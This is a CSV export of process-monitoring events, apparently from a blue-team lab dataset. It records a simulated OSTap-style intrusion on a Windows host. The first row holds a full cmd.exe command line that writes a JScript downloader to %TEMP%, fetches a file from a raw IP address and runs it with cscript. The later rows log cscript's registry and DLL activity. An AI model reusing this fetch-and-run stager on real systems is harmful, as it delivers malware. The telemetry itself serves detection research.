Process Name,PID,Operation,Path,Result,Detail,Date & Time,Event Class,Image Path,User,Command Line,TID,Parent PID,Content,LineID,srcEvent
cmd.exe,3616,Process Start,,SUCCESS,"Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows",4/14/2022 10:03:29 PM,Process,C:\Windows\system32\cmd.exe,BLUETEAM\ezk,"cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js",6244,3264,"cmd.exe 3616 Process Start None SUCCESS Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows 4/14/2022 10:03:29 PM Process C:\Windows\system32\cmd.exe BLUETEAM\ezk cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js 6244 3264",1,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKCR\CLSID\{2087C2F4-2CEF-4953-A8AB-66779B670495},SUCCESS,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKCR\CLSID\{2087C2F4-2CEF-4953-A8AB-66779B670495} SUCCESS Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1653,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495},SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495} SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1654,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495}\Elevation,NAME NOT FOUND,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495}\Elevation NAME NOT FOUND Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1655,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495},SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495} SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1656,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495},SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495} SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1657,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKCR,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKCR SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1658,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKCR\CLSID\{2087C2F4-2CEF-4953-A8AB-66779B670495},SUCCESS,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKCR\CLSID\{2087C2F4-2CEF-4953-A8AB-66779B670495} SUCCESS Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1659,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495},SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495} SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1660,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495}\TreatAs,NAME NOT FOUND,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495}\TreatAs NAME NOT FOUND Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1661,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495},SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKCR\CLSID\{2087c2f4-2cef-4953-a8ab-66779b670495} SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1662,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,"Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\winhttpcom.dll SUCCESS Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1663,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,QueryBasicInformationFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,"CreationTime: 9/22/2021 5:23:05 PM, LastAccessTime: 9/23/2021 3:34:21 PM, LastWriteTime: 9/22/2021 5:23:05 PM, ChangeTime: 10/15/2021 2:25:24 PM, FileAttributes: A",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 QueryBasicInformationFile C:\Windows\System32\winhttpcom.dll SUCCESS CreationTime: 9/22/2021 5:23:05 PM, LastAccessTime: 9/23/2021 3:34:21 PM, LastWriteTime: 9/22/2021 5:23:05 PM, ChangeTime: 10/15/2021 2:25:24 PM, FileAttributes: A 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1664,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CloseFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,,4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 CloseFile C:\Windows\System32\winhttpcom.dll SUCCESS None 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1665,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,"Desired Access: Read Data/List Directory, Execute/Traverse, Synchronize, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\winhttpcom.dll SUCCESS Desired Access: Read Data/List Directory, Execute/Traverse, Synchronize, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1666,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,"Offset: 0, Length: 102,912, I/O Flags: Non-cached, Paging I/O, Synchronous Paging I/O, Priority: Normal",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\winhttpcom.dll SUCCESS Offset: 0, Length: 102,912, I/O Flags: Non-cached, Paging I/O, Synchronous Paging I/O, Priority: Normal 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1667,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CloseFile,C:\Windows\System32\winhttpcom.dll,SUCCESS,,4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 CloseFile C:\Windows\System32\winhttpcom.dll SUCCESS None 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1668,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\msxml3.dll\1,PATH NOT FOUND,"Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Random Access, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\msxml3.dll\1 PATH NOT FOUND Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Random Access, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1669,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,CreateFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Random Access, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 CreateFile C:\Windows\System32\msxml3.dll SUCCESS Desired Access: Generic Read, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Random Access, Attributes: n/a, ShareMode: Read, Delete, AllocationSize: n/a, OpenResult: Opened 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1670,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 0, Length: 64, Priority: Normal",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 0, Length: 64, Priority: Normal 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1671,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 248, Length: 4",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 248, Length: 4 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1672,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 252, Length: 20",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 252, Length: 20 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1673,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 512, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 512, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1674,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 552, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 552, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1675,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 592, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 592, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1676,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 632, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 632, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1677,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 672, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 672, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1678,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 712, Length: 40",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 712, Length: 40 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1679,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,ReadFile,C:\Windows\System32\msxml3.dll,SUCCESS,"Offset: 1,572,352, Length: 16",4/14/2022 10:03:29 PM,File System,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 ReadFile C:\Windows\System32\msxml3.dll SUCCESS Offset: 1,572,352, Length: 16 4/14/2022 10:03:29 PM File System C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1680,522f3f35cd013e63830fa555495a0081_raw_events
